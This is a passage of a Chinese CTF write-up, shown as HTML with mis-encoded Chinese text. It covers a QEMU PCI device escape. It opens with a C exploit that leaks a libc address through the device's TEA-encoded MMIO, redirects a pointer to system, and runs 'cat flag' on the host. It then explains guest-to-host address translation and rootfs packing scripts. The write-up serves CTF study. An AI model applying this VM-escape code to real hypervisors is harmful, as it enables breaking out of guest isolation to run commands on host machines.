class="line">perror(msg);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)(mmio_mem+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123;</span><br><span class="line">    outl(val, PMIO_BASE+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">encode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        v[<span class="number">1</span>] -= ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">0</span>] -= ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        i += <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    getchar();</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);<span class="comment">//set the key to 0</span></span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x100</span>);<span class="comment">//set the seek to 0x100 to prevent addr from overflow the MMIO area</span></span><br><span class="line">    <span class="type">uint64_t</span> rand_r=mmio_read(<span class="number">0x18</span>);<span class="comment">//get address after the tea encode</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address before decode is @%lx\n&quot;</span>,rand_r);</span><br><span class="line">    decode(&amp;rand_r);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r address after decode is @%llx\n&quot;</span>,rand_r);</span><br><span class="line">    <span class="type">uint64_t</span> sys_addr=rand_r+<span class="number">0xa5e0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system address is @%llx\n&quot;</span>,sys_addr);</span><br><span class="line">    encode(&amp;sys_addr);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,sys_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> args=<span class="number">0x67616c66</span>;</span><br><span class="line">    pmio_write(<span class="number">8</span>,<span class="number">0x0</span>);<span class="comment">//set the seek to 0</span></span><br><span class="line">    encode(&amp;args);</span><br><span class="line">    mmio_write(<span class="number">0x0</span>,args);  <span class="comment">// flag</span></span><br><span class="line">    pmio_write(<span class="number">0x1C</span>, <span class="number">0x20746163</span>);  <span class="comment">// cat</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821302.png" alt="image-20230316162420666" style="zoom: 67%;" /><h2 id="å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½"><a href="#å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½" class="headerlink" title="å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½"></a>å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½</h2><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>æ‰§è¡Œ <code>launch.sh</code> è„šæœ¬ï¼Œå°† <code>qemu</code> å¯åŠ¨èµ·æ¥ï¼Œç„¶åç”¨ <code>ps -a | grep qemu</code> æ¥æŸ¥çœ‹ <code>qemu</code> çš„è¿›ç¨‹å·ï¼Œæ¥ç€ <code>sudo gdb qemu-system-x86_64</code>  æ¥å¼€ <code>gdb</code> ï¼Œå†è¾“å…¥ <code>attach pid</code>  é™„åŠ è¿›ç¨‹å¼€å§‹è°ƒè¯•ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261609688.png" alt="image-20230226160922771"></p><p>å‡è®¾æˆ‘ä»¬ç°åœ¨æƒ³ä» <code>qemu-system</code> ä¸­çš„ <code>vn_mmio_read</code> å‡½æ•°è¿™é‡Œå¼€å§‹è°ƒè¯•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸‹è¯¥å‡½æ•°çš„æ–­ç‚¹ï¼ˆæœ¬é¢˜çš„ <code>qemu-system</code> å¹¶æ²¡æœ‰å¼€ <code>PIE</code> ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹æ–­ç‚¹å³å¯ï¼Œå¦‚æœå¼€ <code>PIE</code> çš„è¯åˆ«å¿˜è®°åŠ åŸºåœ°å€ï¼‰ï¼Œå¹¶åœ¨ <code>qemu</code> ä¸­è¿è¡Œ <code>exp</code> ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œä»è€Œæ¥è°ƒè¯•æŸ¥çœ‹æˆ‘ä»¬å…³æ³¨çš„ä¿¡æ¯</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302261610355.png" alt="image-20230226161041668"></p><h3 id="qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜"><a href="#qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜" class="headerlink" title="qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜"></a>qemuä¸­çš„è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜</h3><p>åœ¨è¿™ä¹‹å‰è¦å…ˆæ˜ç™½ä¸¤ç‚¹ï¼Œç¬¬ä¸€ç‚¹æ˜¯å®¢æˆ·æœº æŒ‡çš„æ˜¯è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­çš„æ“ä½œç³»ç»ŸåŠå…¶åº”ç”¨ç¨‹åºã€‚è€Œå®¿ä¸»æœº åˆ™æŒ‡çš„æ˜¯è¿è¡Œè™šæ‹Ÿæœºçš„ç‰©ç†æœº ã€‚ç¬¬äºŒï¼Œ<code>qemu</code> è·‘åœ¨å®¿ä¸»æœºé‡Œï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œå’Œå…¶ä»–è¿›ç¨‹æ²¡æœ‰ä»»ä½•åŒºåˆ«</p><p>æ‰€ä»¥æ¥ä¸‹æ¥æœ‰å››ä¸ªåœ°å€ï¼Œåˆ†åˆ«æ˜¯ å®¢æˆ·æœºçš„ç‰©ç†åœ°å€ï¼Œå®¢æˆ·æœºçš„è™šæ‹Ÿåœ°å€ï¼Œå®¿ä¸»æœºçš„ç‰©ç†åœ°å€ï¼Œå®¿ä¸»æœºçš„è™šæ‹Ÿåœ°å€</p><ul><li><p>å®¿ä¸»æœºçš„ç‰©ç†åœ°å€ï¼šæŒ‡çš„æ˜¯ç‰©ç†å†…å­˜æ¡ä¸Šçš„åœ°å€ï¼Œå³ç¡¬ä»¶ç›´æ¥è®¿é—®çš„ç‰©ç†åœ°å€ã€‚</p></li><li><p>å®¿ä¸»æœºçš„è™šæ‹Ÿåœ°å€ï¼šæ“ä½œç³»ç»Ÿæ‰€å‘ˆç°ç»™æˆ‘ä»¬çš„è™šå‡åœ°å€ï¼Œå®ƒä»¬è¢«ç”¨æ¥è®¿é—®å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹</p></li><li><p>å®¢æˆ·æœºçš„ç‰©ç†åœ°å€ï¼šç”± <code>qemu</code> ç¨‹åºæ‰§è¡Œäº† <code>mmap</code> å‡½æ•°ï¼Œæ˜ å°„äº†ä¸€ç‰‡å†…å­˜ç©ºé—´å‡ºæ¥ï¼Œä½œä¸ºå®¢æˆ·æœºçš„ç‰©ç†åœ°å€</p></li><li><p>å®¢æˆ·æœºçš„è™šæ‹Ÿåœ°å€ï¼šå®¢æˆ·æœºé‡Œçš„æ“ä½œç³»ç»Ÿå°†åˆšåˆšæ˜ å°„å‡ºæ¥çš„é‚£ç‰‡å†…å­˜ç©ºé—´ç»è¿‡è½¬æ¢ï¼Œå‘ˆç°ç»™æˆ‘ä»¬äº†ä¸€ä¸ªè™šå‡åœ°å€</p></li></ul><p>æ­¤æ—¶å¦‚æœå†å»ä»”ç»†åˆ†æä¸‹é¢è¿™ä¸ªå›¾ ï¼ˆæ¥è‡ª <a href="https://bbs.kanxue.com/thread-265501.htm">https://bbs.kanxue.com/thread-265501.htm</a> ï¼‰  çš„è¯ï¼Œå°±å¤§æ¦‚èƒ½ä½“ä¼šåˆ°è¿™äº›åœ°å€ç›´æ¥çš„å…³ç³»äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                       Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+                                    ï¼ˆGVAï¼‰</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |            ï¼ˆGPAï¼‰</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |         ï¼ˆHVAï¼‰</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||    ï¼ˆHPAï¼‰</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><h4 id="è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹"><a href="#è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹" class="headerlink" title="è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹"></a>è™šæ‹Ÿåœ°å€è½¬æ¢ç‰©ç†åœ°å€çš„è¿‡ç¨‹</h4><p>ç„¶åç®€å•è¯´ä¸€ä¸‹å°†è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€çš„æ€è·¯</p><p>æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨ï¼ˆå­˜å‚¨åœ¨ <code>/proc/self/pagemap</code> æ–‡ä»¶ä¸­ï¼‰ï¼Œé¡µè¡¨ç”±ä¸€ä¸ªæˆ–å¤šä¸ªé¡µè¡¨é¡¹ç»„æˆï¼Œæ¯ä¸ªé¡µè¡¨é¡¹è®°å½•äº†ä¸€ä¸ªè™šæ‹Ÿé¡µåˆ°ç‰©ç†é¡µçš„æ˜ å°„å…³ç³»ï¼Œåœ¨ <code>64</code> ä½ <code>Linux</code> ç³»ç»Ÿä¸­ï¼Œé¡µè¡¨é¡¹ä¸º <code>64</code> ä½ã€‚</p><p>ç°åœ¨ç»™å‡ºä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå°†å…¶å³ç§» <code>9</code> ä½çš„è¯ï¼Œå¾—åˆ°çš„æ˜¯é¡µè¡¨é¡¹åç§»é‡ï¼ˆé¡µè¡¨é¡¹åœ¨é¡µè¡¨ä¸­çš„åç§»ï¼‰,è¿™é‡Œ <code>&amp; ~7</code> æ˜¯å°†é¡µè¡¨é¡¹åç§»é‡å‘ä¸‹å¯¹é½åˆ°8å­—èŠ‚è¾¹ç•Œä¸Šï¼ˆå› ä¸ºé¡µè¡¨é¡¹æ˜¯å…«å­—èŠ‚ï¼Œè¿™é‡Œæ˜¯è¦å…«å­—èŠ‚å¯¹é½ï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">offset = (addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°é¡µè¡¨é¡¹åç§»é‡ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å»ç”¨ <code>lseek</code> å’Œ <code>read</code> å‡½æ•°ä» <code>pagemap</code> æ–‡ä»¶ä¸­è¯»å–ä¸€ä¸ªé¡µè¡¨é¡¹çš„ä¿¡æ¯ï¼Œè¯»å–å‡ºæ¥çš„ä¿¡æ¯åŒ…æ‹¬ï¼š</p><ul><li><p>bit 0-54 å­˜å‚¨ç‰©ç†é¡µå¸§å·</p></li><li><p>bit 55-62 ä¸ºä¿ç•™ä½</p></li><li><p>bit 63 å­˜å‚¨é¡µé¢æ˜¯å¦å­˜åœ¨</p><p>å¦‚æœå­˜å‚¨é¡µé¢å­˜åœ¨çš„è¯ï¼Œé‚£æˆ‘ä»¬å°±è¯»å–å®ƒçš„ç‰©ç†é¡µå¸§å·ï¼Œæœ€ç»ˆè¦è·å–ç‰©ç†çš„åœ°å€çš„è¯ï¼Œéœ€è¦ç‰©ç†é¡µå¸§å·å’Œé¡µé¢å†…åç§»é‡ï¼ˆè™šæ‹Ÿåœ°å€å°†å…¶å³ç§» <code>12</code> ä½ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬æœ€åçš„ç‰©ç†åœ°å€æ˜¯å°†ç‰©ç†é¡µå¸§å·å·¦ç§» <code>12</code> ä½ï¼Œå°†å…¶æˆ–ï¼ˆ <code>|</code> ï¼‰ä¸Šé¡µé¢å†…åç§»é‡ï¼Œå³å¯å¾—åˆ°ç‰©ç†åœ°å€ã€‚</p></li></ul><h4 id="ç¨‹åºéªŒè¯"><a href="#ç¨‹åºéªŒè¯" class="headerlink" title="ç¨‹åºéªŒè¯"></a>ç¨‹åºéªŒè¯</h4><p>ç”¨ç½‘ä¸Šå…¶ä»–å¸ˆå‚…çš„ä¸€ä¸ªç¨‹åºæ¥éªŒè¯ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="comment">// è·å–é¡µå†…åç§»</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// addr &amp; 0xfff</span></span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pfn_item_offset : %p\n&quot;</span>, (<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>);</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;<span class="comment">//å¾—åˆ°çš„æ˜¯é¡µè¡¨é¡¹åç§»é‡</span></span><br><span class="line"> </span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);<span class="comment">//è¯»å–ä¸€ä¸ªé¡µè¡¨é¡¹çš„ä¿¡æ¯</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))<span class="comment">// ç¡®ä¿é¡µé¢å­˜åœ¨â€”â€”page is present.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// physical frame number</span></span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;<span class="comment">//è¿”å›ç‰©ç†é¡µå¸§å·</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);<span class="comment">//é€šè¿‡ç‰©ç†é¡µå¸§å·å’Œé¡µå†…åç§»é‡æ¥å¾—åˆ°ç‰©ç†åœ°å€</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> *ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual address %p\n&quot;</span>,ptr);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"> </span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†å…¶ç¼–è¯‘åæ”¾å…¥ <code>qemu</code> ä¸­ï¼Œè°ƒè¯•ä¸€ä¸‹ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051312873.png" alt="image-20230305131217704"></p><p>å› ä¸ºå¯ <code>qemu</code> çš„æ—¶å€™ï¼Œç»™çš„æ˜¯ <code>64M</code> çš„å†…å­˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ‰¾è¿™ä¸ª <code>0x4000000</code>  çš„èµ·å§‹å†…å­˜åœ°å€ï¼Œå‘ç°æ˜¯ <code>0x7fc254c00000</code> ï¼Œç„¶åç”¨è¿™ä¸ªåœ°å€åŠ ä¸Šç‰©ç†å†…å­˜ï¼Œå°±èƒ½æ‰¾åˆ°å­—ç¬¦ä¸² <code>Where am I?</code> </p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303051350957.png" alt="image-20230305135007883"></p><p>å¦‚æœæˆ‘ä»¬å¸Œæœ›æœ¬åœ°è°ƒè¯•è„šæœ¬ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯éœ€è¦å°† <code>exp</code> æ–‡ä»¶æ”¾å…¥åˆ° <code>qemu</code> ä¸­çš„ï¼Œè¿™é‡Œçš„é€šç”¨æ–¹æ³•æ˜¯æœ¬åœ°å…ˆå°†æ–‡ä»¶ç³»ç»Ÿè§£åŒ…ï¼Œç„¶åæŠŠ <code>exp.c</code> æ”¾è¿›å»ï¼Œå†æ‰“åŒ…å³å¯ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹</p><h3 id="è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬"><a href="#è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬" class="headerlink" title="è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬"></a>è§£åŒ…å’Œæ‰“åŒ…è„šæœ¬</h3><h4 id="å¯¹-cpio-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"><a href="#å¯¹-cpio-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…" class="headerlink" title="å¯¹ cpio æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"></a>å¯¹ <code>cpio</code> æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…</h4><p>è§£åŒ…è„šæœ¬ï¼ˆå¦‚æœç¼ºå°‘ <code>unar</code> çš„è¯ï¼Œè¯·è‡ªè¡Œå®‰è£…ï¼‰ è½¬è‡ª <a href="https://www.jianshu.com/p/f08e34cf08ad">https://www.jianshu.com/p/f08e34cf08ad</a>  å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">mv $1 $1.gz</span><br><span class="line">unar $1.gz</span><br><span class="line">mv $1 core</span><br><span class="line">mv $1.gz $1</span><br><span class="line">echo &quot;[+]Successful&quot;</span><br></pre></td></tr></table></figure><p>æ‰“åŒ…è„šæœ¬</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1 </span><br><span class="line">mv $1 ..</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸¤ä¸ªè„šæœ¬éƒ½æ”¾ç½®åˆ° <code>/usr/local/bin</code> ç›®å½•ä¸‹ï¼Œå°†è§£åŒ…è„šæœ¬å‘½åä¸º <code>hen</code>  æ‰“åŒ…è„šæœ¬å‘½åä¸º <code>gen</code></p><p><strong>æœ€ååˆ«å¿˜è®°ç»™å®ƒä»¬å¯æ‰§è¡Œæƒé™</strong></p><h5 id="ä½¿ç”¨æ–¹æ³•ï¼š"><a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ï¼š"></a>ä½¿ç”¨æ–¹æ³•ï¼š</h5><p>ä½¿ç”¨ <code>hen rootfs.cpio</code> å‘½ä»¤ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ª <code>core</code> æ–‡ä»¶å¤¹ï¼Œç„¶å <code>cd core</code> ï¼Œå°†å‡†å¤‡ç¼–è¯‘å¥½çš„ <code>exp</code> æ–‡ä»¶å¤åˆ¶è¿›æ¥ã€‚ç„¶ååœ¨ <code>core</code> ç›®å½•æ‰§è¡Œ <code>gen rootfs.cpio</code> å‘½ä»¤å³å¯ï¼ˆæ³¨æ„ï¼Œè§£åŒ…å‘½ä»¤æ˜¯åœ¨ <code>core</code> æ–‡ä»¶çš„ä¸Šä¸€çº§ä½¿ç”¨çš„ï¼Œæ‰“åŒ…å‘½ä»¤æ˜¯åœ¨ <code>core</code> æ–‡ä»¶ä¸­ä½¿ç”¨çš„ï¼‰</p><p>æœ€åé‡æ–°è¿è¡Œ <code>launch.sh</code> ï¼Œè¿›å…¥åˆ° <code>qemu</code> ä¸­åï¼Œå°±å¯ä»¥çœ‹åˆ° <code>exp</code> æ–‡ä»¶äº†ã€‚</p><h4 id="å¯¹-img-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"><a href="#å¯¹-img-æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…" class="headerlink" title="å¯¹ img æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…"></a>å¯¹ <code>img</code> æ–‡ä»¶çš„æ‰“åŒ…å’Œè§£åŒ…</h4><p>å¦‚æœæ˜¯ <code>rootfs.img</code> æ–‡ä»¶çš„è¯ï¼Œå°±åˆ›å»ºä¸€ä¸ª <code>rootfs</code> æ–‡ä»¶å¤¹ï¼Œç„¶åå°† <code>rootfs.img</code> æ–‡ä»¶å¤åˆ¶è¿›å»ï¼Œæ‰§è¡Œå‘½ä»¤ <code>cpio -ivmd &lt; rootfs.img </code> ï¼Œè§£åŒ…åï¼Œå°† <code>exp</code> å¤åˆ¶åˆ° <code>rootfs</code> æ–‡ä»¶å¤¹ä¸­ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ï¼ˆåœ¨ <code>rootfs</code> æ–‡ä»¶ä¸­æ‰§è¡Œï¼‰ <code>find . | cpio -o -H newc | gzip -9  &gt; ../rootfs.img </code> å³å¯å°† <code>exp</code> æ‰“åŒ…è¿›å»ã€‚</p><h3 id="musl-gcc-çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®"><a href="#musl-gcc-çš„ç¼–è¯‘ä¸ç¯å¢ƒå˜é‡çš„é…ç½®" class="headerlink" title="musl-gcc 